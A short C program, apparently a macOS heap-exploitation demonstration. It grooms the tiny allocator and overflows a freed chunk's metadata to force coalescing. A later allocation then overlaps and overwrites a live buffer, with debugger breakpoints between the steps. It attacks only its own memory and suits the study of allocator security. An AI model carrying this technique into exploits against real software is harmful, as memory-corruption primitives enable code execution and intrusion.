#include <pthread.h>
#include <mach/mach_init.h>
#include <mach/thread_act.h>
#include <mach/thread_policy.h>
#include <mach/error.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>

#define QUANT 16

#define RED   "\x1B[31m"
#define GRN   "\x1B[32m"
#define YEL   "\x1B[33m"
#define BLU   "\x1B[34m"
#define MAG   "\x1B[35m"
#define CYN   "\x1B[36m"
#define WHT   "\x1B[37m"
#define RESET "\x1B[0m"

//Initialize the heap 
void init(){
	free(malloc(QUANT*3));
	malloc(QUANT*3);
	malloc(QUANT*3);
	free(malloc(QUANT*3));
	free(malloc(QUANT*3));
	malloc(QUANT*3);
	malloc(QUANT*3);
	free(malloc(QUANT*3));
	free(malloc(QUANT*3));	
	malloc(QUANT*3);
	malloc(QUANT*3);
	free(malloc(QUANT*3));
	free(malloc(QUANT*3));
}

int main(){
	int* x[10], *good, *p, *y;

	init();

	for(int i = 0; i < 10; ++i) {x[i] = malloc(QUANT*i);
		printf(CYN "Q= %d - %p" RESET "\n" ,i,  x[i]);
		memset(x[i], 0x41, QUANT*i);
	}
	
	free(malloc(QUANT*3));

	printf(GRN "Target for overwrite = %p" RESET "\n", x[9]);
	for(int i = 0; i < 9; ++i) free(x[i]);


	x[0] = malloc(5*QUANT);
	printf(CYN "Overflow buffer @: %p" RESET "\n", x[0]);
	asm("int3\n");

	malloc(63*QUANT);

	y = x[0];
	y += 2*QUANT;
	memset(y, 0x87, 15);

	printf(GRN "Overflow complete" RESET "\n");
	printf(CYN "Freeing 5 quantum for coalesce" RESET "\n");
	asm("int3\n");

	free(malloc(5*QUANT));

	good = malloc(63*QUANT);
	printf(GRN "Malloc 63 q from 30 q slot %p" RESET "\n", good);
	asm("int3\n");

	printf(CYN "Overwriting in use buffer:" RESET "\n");
	printf(CYN "X[9] before: %s" RESET "\n", x[9]);
	memset(good, 0x5a, 63*QUANT);
	printf(GRN "x[9] after:  %s" RESET "\n", x[9]);


}
